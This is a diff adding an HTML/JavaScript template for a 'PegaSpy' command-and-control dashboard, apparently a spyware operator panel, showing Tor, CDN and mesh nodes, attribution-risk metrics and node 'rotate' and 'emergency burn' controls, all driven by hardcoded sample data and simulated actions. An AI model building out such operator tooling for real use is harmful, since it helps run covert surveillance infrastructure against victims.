@@ -1,0 +1,564 @@
+{% extends "base.html" %}
+
+{% block title %}C2 Infrastructure - PegaSpy{% endblock %}
+
+{% block content %}
+<div class="d-flex justify-content-between align-items-center mb-4">
+    <h2><i class="fas fa-network-wired"></i> C2 Infrastructure</h2>
+    <div class="btn-group" role="group">
+        <button class="btn btn-success" onclick="expandNetwork()">
+            <i class="fas fa-plus"></i> Expand Network
+        </button>
+        <button class="btn btn-warning" onclick="rotateNodes()">
+            <i class="fas fa-sync"></i> Rotate Nodes
+        </button>
+        <button class="btn btn-danger" onclick="emergencyBurn()">
+            <i class="fas fa-fire"></i> Emergency Burn
+        </button>
+    </div>
+</div>
+
+<div class="row mb-4">
+    <div class="col-md-2">
+        <div class="card">
+            <div class="card-body text-center">
+                <h5 class="card-title">Tor Nodes</h5>
+                <h2 class="text-success">{{ c2_status.tor_nodes }}</h2>
+                <small class="text-muted">Active</small>
+            </div>
+        </div>
+    </div>
+    <div class="col-md-2">
+        <div class="card">
+            <div class="card-body text-center">
+                <h5 class="card-title">Blockchain Channels</h5>
+                <h2 class="text-info">{{ c2_status.blockchain_channels }}</h2>
+                <small class="text-muted">Encrypted</small>
+            </div>
+        </div>
+    </div>
+    <div class="col-md-2">
+        <div class="card">
+            <div class="card-body text-center">
+                <h5 class="card-title">CDN Endpoints</h5>
+                <h2 class="text-warning">{{ c2_status.cdn_endpoints }}</h2>
+                <small class="text-muted">Distributed</small>
+            </div>
+        </div>
+    </div>
+    <div class="col-md-2">
+        <div class="card">
+            <div class="card-body text-center">
+                <h5 class="card-title">Mesh Peers</h5>
+                <h2 class="text-primary">{{ c2_status.mesh_peers }}</h2>
+                <small class="text-muted">Connected</small>
+            </div>
+        </div>
+    </div>
+    <div class="col-md-2">
+        <div class="card">
+            <div class="card-body text-center">
+                <h5 class="card-title">Bandwidth</h5>
+                <h2 class="text-success">{{ c2_status.total_bandwidth }}</h2>
+                <small class="text-muted">Total</small>
+            </div>
+        </div>
+    </div>
+    <div class="col-md-2">
+        <div class="card">
+            <div class="card-body text-center">
+                <h5 class="card-title">Anonymity</h5>
+                <h2 class="text-success">{{ c2_status.anonymity_level }}</h2>
+                <small class="text-muted">Level</small>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mb-4">
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-globe"></i> Global Network Map</h5>
+            </div>
+            <div class="card-body">
+                <div id="networkMap" style="height: 400px; background: #0a0a0a; border: 1px solid #00ff00; position: relative;">
+                    <!-- Network visualization will be rendered here -->
+                    <canvas id="networkCanvas" width="100%" height="400"></canvas>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="col-md-4">
+        <div class="card mb-3">
+            <div class="card-header">
+                <h5><i class="fas fa-shield-alt"></i> Security Status</h5>
+            </div>
+            <div class="card-body">
+                <div class="mb-3">
+                    <div class="d-flex justify-content-between">
+                        <span>Encryption Level</span>
+                        <span class="text-success">AES-256</span>
+                    </div>
+                    <div class="progress mt-1">
+                        <div class="progress-bar bg-success" style="width: 100%"></div>
+                    </div>
+                </div>
+                <div class="mb-3">
+                    <div class="d-flex justify-content-between">
+                        <span>Traffic Obfuscation</span>
+                        <span class="text-success">Active</span>
+                    </div>
+                    <div class="progress mt-1">
+                        <div class="progress-bar bg-success" style="width: 95%"></div>
+                    </div>
+                </div>
+                <div class="mb-3">
+                    <div class="d-flex justify-content-between">
+                        <span>Node Rotation</span>
+                        <span class="text-warning">12min</span>
+                    </div>
+                    <div class="progress mt-1">
+                        <div class="progress-bar bg-warning" style="width: 75%"></div>
+                    </div>
+                </div>
+                <div class="mb-3">
+                    <div class="d-flex justify-content-between">
+                        <span>Attribution Risk</span>
+                        <span class="text-success">Minimal</span>
+                    </div>
+                    <div class="progress mt-1">
+                        <div class="progress-bar bg-success" style="width: 98%"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-chart-line"></i> Traffic Analytics</h5>
+            </div>
+            <div class="card-body">
+                <canvas id="trafficChart" width="100%" height="200"></canvas>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-server"></i> Active Nodes</h5>
+            </div>
+            <div class="card-body">
+                <div class="table-responsive">
+                    <table class="table table-dark table-sm">
+                        <thead>
+                            <tr>
+                                <th>Node ID</th>
+                                <th>Type</th>
+                                <th>Location</th>
+                                <th>Status</th>
+                                <th>Latency</th>
+                                <th>Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="nodesTable">
+                            <!-- Nodes will be populated dynamically -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header">
+                <h5><i class="fas fa-history"></i> Recent Activity</h5>
+            </div>
+            <div class="card-body">
+                <div id="activityLog" style="height: 300px; overflow-y: auto; font-family: monospace; font-size: 12px;">
+                    <!-- Activity log will be populated here -->
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Node Details Modal -->
+<div class="modal fade" id="nodeDetailsModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content bg-dark">
+            <div class="modal-header border-success">
+                <h5 class="modal-title"><i class="fas fa-server"></i> Node Details</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body" id="nodeDetailsContent">
+                <!-- Node details will be loaded here -->
+            </div>
+            <div class="modal-footer border-success">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                <button type="button" class="btn btn-warning" id="rotateNodeBtn">Rotate Node</button>
+                <button type="button" class="btn btn-danger" id="burnNodeBtn">Burn Node</button>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<script>
+// Sample node data
+const nodes = [
+    { id: 'tor-001', type: 'Tor', location: 'Netherlands', status: 'active', latency: '45ms', ip: '185.220.xxx.xxx' },
+    { id: 'tor-002', type: 'Tor', location: 'Germany', status: 'active', latency: '32ms', ip: '185.243.xxx.xxx' },
+    { id: 'bc-001', type: 'Blockchain', location: 'Switzerland', status: 'active', latency: '78ms', ip: 'N/A' },
+    { id: 'cdn-001', type: 'CDN', location: 'USA', status: 'active', latency: '12ms', ip: '104.16.xxx.xxx' },
+    { id: 'mesh-001', type: 'Mesh', location: 'Singapore', status: 'active', latency: '156ms', ip: '103.28.xxx.xxx' },
+    { id: 'tor-003', type: 'Tor', location: 'Sweden', status: 'rotating', latency: '67ms', ip: '199.87.xxx.xxx' },
+    { id: 'cdn-002', type: 'CDN', location: 'Japan', status: 'active', latency: '89ms', ip: '172.67.xxx.xxx' },
+    { id: 'mesh-002', type: 'Mesh', location: 'Brazil', status: 'active', latency: '234ms', ip: '177.54.xxx.xxx' }
+];
+
+// Initialize traffic chart
+const trafficCtx = document.getElementById('trafficChart').getContext('2d');
+const trafficChart = new Chart(trafficCtx, {
+    type: 'line',
+    data: {
+        labels: ['1h', '45m', '30m', '15m', '5m', 'Now'],
+        datasets: [{
+            label: 'Bandwidth (MB/s)',
+            data: [120, 135, 98, 156, 178, 145],
+            borderColor: '#00ff00',
+            backgroundColor: 'rgba(0, 255, 0, 0.1)',
+            tension: 0.4
+        }]
+    },
+    options: {
+        responsive: true,
+        scales: {
+            y: {
+                beginAtZero: true,
+                ticks: { color: '#00ff00' }
+            },
+            x: {
+                ticks: { color: '#00ff00' }
+            }
+        },
+        plugins: {
+            legend: {
+                labels: { color: '#00ff00' }
+            }
+        }
+    }
+});
+
+// Initialize network map
+function initNetworkMap() {
+    const canvas = document.getElementById('networkCanvas');
+    const ctx = canvas.getContext('2d');
+    
+    // Set canvas size
+    canvas.width = canvas.offsetWidth;
+    canvas.height = 400;
+    
+    // Draw network nodes
+    function drawNetwork() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        
+        // Draw connections
+        ctx.strokeStyle = '#00aa00';
+        ctx.lineWidth = 1;
+        
+        // Sample connections between nodes
+        const connections = [
+            [100, 100, 300, 150],
+            [300, 150, 500, 200],
+            [100, 100, 200, 300],
+            [300, 150, 400, 300],
+            [500, 200, 600, 100],
+            [200, 300, 400, 300]
+        ];
+        
+        connections.forEach(([x1, y1, x2, y2]) => {
+            ctx.beginPath();
+            ctx.moveTo(x1, y1);
+            ctx.lineTo(x2, y2);
+            ctx.stroke();
+        });
+        
+        // Draw nodes
+        const nodePositions = [
+            { x: 100, y: 100, type: 'tor', label: 'Tor Exit' },
+            { x: 300, y: 150, type: 'blockchain', label: 'Blockchain' },
+            { x: 500, y: 200, type: 'cdn', label: 'CDN' },
+            { x: 200, y: 300, type: 'mesh', label: 'Mesh' },
+            { x: 400, y: 300, type: 'tor', label: 'Tor Relay' },
+            { x: 600, y: 100, type: 'cdn', label: 'CDN Edge' }
+        ];
+        
+        nodePositions.forEach(node => {
+            // Node circle
+            ctx.beginPath();
+            ctx.arc(node.x, node.y, 15, 0, 2 * Math.PI);
+            
+            switch(node.type) {
+                case 'tor':
+                    ctx.fillStyle = '#ff6b35';
+                    break;
+                case 'blockchain':
+                    ctx.fillStyle = '#4ecdc4';
+                    break;
+                case 'cdn':
+                    ctx.fillStyle = '#45b7d1';
+                    break;
+                case 'mesh':
+                    ctx.fillStyle = '#96ceb4';
+                    break;
+            }
+            
+            ctx.fill();
+            ctx.strokeStyle = '#00ff00';
+            ctx.lineWidth = 2;
+            ctx.stroke();
+            
+            // Node label
+            ctx.fillStyle = '#00ff00';
+            ctx.font = '10px monospace';
+            ctx.textAlign = 'center';
+            ctx.fillText(node.label, node.x, node.y + 30);
+        });
+        
+        // Animate data flow
+        const time = Date.now() * 0.001;
+        connections.forEach(([x1, y1, x2, y2], i) => {
+            const progress = (Math.sin(time + i) + 1) / 2;
+            const x = x1 + (x2 - x1) * progress;
+            const y = y1 + (y2 - y1) * progress;
+            
+            ctx.beginPath();
+            ctx.arc(x, y, 3, 0, 2 * Math.PI);
+            ctx.fillStyle = '#00ff00';
+            ctx.fill();
+        });
+    }
+    
+    // Animate the network
+    setInterval(drawNetwork, 100);
+}
+
+// Populate nodes table
+function populateNodesTable() {
+    const tbody = document.getElementById('nodesTable');
+    tbody.innerHTML = '';
+    
+    nodes.forEach(node => {
+        const row = document.createElement('tr');
+        row.innerHTML = `
+            <td><code>${node.id}</code></td>
+            <td><span class="badge bg-info">${node.type}</span></td>
+            <td>${node.location}</td>
+            <td>
+                <span class="badge bg-${node.status === 'active' ? 'success' : 'warning'}">
+                    ${node.status.charAt(0).toUpperCase() + node.status.slice(1)}
+                </span>
+            </td>
+            <td>${node.latency}</td>
+            <td>
+                <button class="btn btn-sm btn-info" onclick="viewNodeDetails('${node.id}')">
+                    <i class="fas fa-eye"></i>
+                </button>
+                <button class="btn btn-sm btn-warning" onclick="rotateNode('${node.id}')">
+                    <i class="fas fa-sync"></i>
+                </button>
+                <button class="btn btn-sm btn-danger" onclick="burnNode('${node.id}')">
+                    <i class="fas fa-fire"></i>
+                </button>
+            </td>
+        `;
+        tbody.appendChild(row);
+    });
+}
+
+// Populate activity log
+function populateActivityLog() {
+    const log = document.getElementById('activityLog');
+    const activities = [
+        { time: new Date(), level: 'info', message: 'Node tor-001 rotated successfully' },
+        { time: new Date(Date.now() - 60000), level: 'success', message: 'New mesh peer connected from Australia' },
+        { time: new Date(Date.now() - 120000), level: 'warning', message: 'High latency detected on cdn-002' },
+        { time: new Date(Date.now() - 180000), level: 'info', message: 'Blockchain channel bc-001 synchronized' },
+        { time: new Date(Date.now() - 240000), level: 'success', message: 'Traffic obfuscation layer updated' },
+        { time: new Date(Date.now() - 300000), level: 'info', message: 'Tor circuit rebuilt for enhanced anonymity' }
+    ];
+    
+    log.innerHTML = '';
+    activities.forEach(activity => {
+        const div = document.createElement('div');
+        div.className = `text-${activity.level === 'info' ? 'info' : activity.level === 'success' ? 'success' : 'warning'}`;
+        div.innerHTML = `[${activity.time.toISOString()}] ${activity.message}`;
+        log.appendChild(div);
+    });
+}
+
+function expandNetwork() {
+    if (confirm('Expand the C2 network by adding new nodes?')) {
+        alert('Network expansion initiated. New nodes will be online in 2-3 minutes.');
+        // Add new nodes to the display
+        const newNode = {
+            id: `tor-${String(Math.floor(Math.random() * 1000)).padStart(3, '0')}`,
+            type: 'Tor',
+            location: 'France',
+            status: 'connecting',
+            latency: 'N/A',
+            ip: '51.15.xxx.xxx'
+        };
+        nodes.push(newNode);
+        populateNodesTable();
+    }
+}
+
+function rotateNodes() {
+    if (confirm('Rotate all active nodes for enhanced security?')) {
+        alert('Node rotation initiated. This may cause temporary connectivity issues.');
+        // Update node statuses
+        nodes.forEach(node => {
+            if (node.status === 'active') {
+                node.status = 'rotating';
+            }
+        });
+        populateNodesTable();
+        
+        // Simulate rotation completion
+        setTimeout(() => {
+            nodes.forEach(node => {
+                if (node.status === 'rotating') {
+                    node.status = 'active';
+                    node.latency = `${Math.floor(Math.random() * 200) + 10}ms`;
+                }
+            });
+            populateNodesTable();
+            alert('Node rotation completed successfully.');
+        }, 5000);
+    }
+}
+
+function emergencyBurn() {
+    if (confirm('EMERGENCY BURN: This will destroy all C2 infrastructure and cannot be undone. Continue?')) {
+        if (confirm('Are you absolutely sure? This action is irreversible.')) {
+            alert('Emergency burn sequence initiated. All nodes will self-destruct in 30 seconds.');
+            
+            // Simulate burning nodes
+            let countdown = 30;
+            const burnInterval = setInterval(() => {
+                if (countdown <= 0) {
+                    clearInterval(burnInterval);
+                    nodes.length = 0;
+                    populateNodesTable();
+                    document.getElementById('activityLog').innerHTML = '<div class="text-danger">[EMERGENCY] All nodes destroyed. Network offline.</div>';
+                    alert('Emergency burn completed. All infrastructure destroyed.');
+                } else {
+                    document.getElementById('activityLog').innerHTML = `<div class="text-danger">[EMERGENCY] Self-destruct in ${countdown} seconds...</div>`;
+                    countdown--;
+                }
+            }, 1000);
+        }
+    }
+}
+
+function viewNodeDetails(nodeId) {
+    const node = nodes.find(n => n.id === nodeId);
+    if (!node) return;
+    
+    const detailsContent = `
+        <div class="row">
+            <div class="col-md-6">
+                <h6>Node Information</h6>
+                <table class="table table-dark table-sm">
+                    <tr><td>ID:</td><td><code>${node.id}</code></td></tr>
+                    <tr><td>Type:</td><td>${node.type}</td></tr>
+                    <tr><td>Location:</td><td>${node.location}</td></tr>
+                    <tr><td>Status:</td><td><span class="badge bg-success">${node.status}</span></td></tr>
+                    <tr><td>Latency:</td><td>${node.latency}</td></tr>
+                    <tr><td>IP Address:</td><td><code>${node.ip}</code></td></tr>
+                </table>
+            </div>
+            <div class="col-md-6">
+                <h6>Performance Metrics</h6>
+                <table class="table table-dark table-sm">
+                    <tr><td>Uptime:</td><td>99.7%</td></tr>
+                    <tr><td>Bandwidth:</td><td>156 MB/s</td></tr>
+                    <tr><td>Connections:</td><td>1,247</td></tr>
+                    <tr><td>Data Transferred:</td><td>2.3 TB</td></tr>
+                    <tr><td>Last Rotation:</td><td>2h 15m ago</td></tr>
+                    <tr><td>Security Score:</td><td><span class="text-success">A+</span></td></tr>
+                </table>
+            </div>
+        </div>
+        <div class="mt-3">
+            <h6>Recent Activity</h6>
+            <div class="bg-black p-3" style="height: 150px; overflow-y: auto; font-family: monospace; font-size: 12px;">
+                <div class="text-success">[${new Date().toISOString()}] Node operational</div>
+                <div class="text-info">[${new Date(Date.now() - 60000).toISOString()}] Traffic routed: 45.2 MB</div>
+                <div class="text-warning">[${new Date(Date.now() - 120000).toISOString()}] Latency spike detected: 89ms</div>
+                <div class="text-success">[${new Date(Date.now() - 180000).toISOString()}] Connection established from mesh-003</div>
+            </div>
+        </div>
+    `;
+    
+    document.getElementById('nodeDetailsContent').innerHTML = detailsContent;
+    document.getElementById('rotateNodeBtn').onclick = () => rotateNode(nodeId);
+    document.getElementById('burnNodeBtn').onclick = () => burnNode(nodeId);
+    
+    new bootstrap.Modal(document.getElementById('nodeDetailsModal')).show();
+}
+
+function rotateNode(nodeId) {
+    if (confirm(`Rotate node ${nodeId}?`)) {
+        const node = nodes.find(n => n.id === nodeId);
+        if (node) {
+            node.status = 'rotating';
+            populateNodesTable();
+            
+            setTimeout(() => {
+                node.status = 'active';
+                node.latency = `${Math.floor(Math.random() * 200) + 10}ms`;
+                populateNodesTable();
+            }, 3000);
+        }
+        bootstrap.Modal.getInstance(document.getElementById('nodeDetailsModal')).hide();
+    }
+}
+
+function burnNode(nodeId) {
+    if (confirm(`Burn node ${nodeId}? This will permanently destroy it.`)) {
+        const index = nodes.findIndex(n => n.id === nodeId);
+        if (index !== -1) {
+            nodes.splice(index, 1);
+            populateNodesTable();
+        }
+        bootstrap.Modal.getInstance(document.getElementById('nodeDetailsModal')).hide();
+        alert(`Node ${nodeId} has been burned and destroyed.`);
+    }
+}
+
+// Initialize everything
+document.addEventListener('DOMContentLoaded', function() {
+    initNetworkMap();
+    populateNodesTable();
+    populateActivityLog();
+    
+    // Update activity log every 30 seconds
+    setInterval(populateActivityLog, 30000);
+});
+
+// Socket.IO for real-time updates
+const socket = io();
+socket.on('c2_update', function(data) {
+    // Handle real-time C2 updates
+    console.log('C2 update received:', data);
+});
+</script>
+{% endblock %}
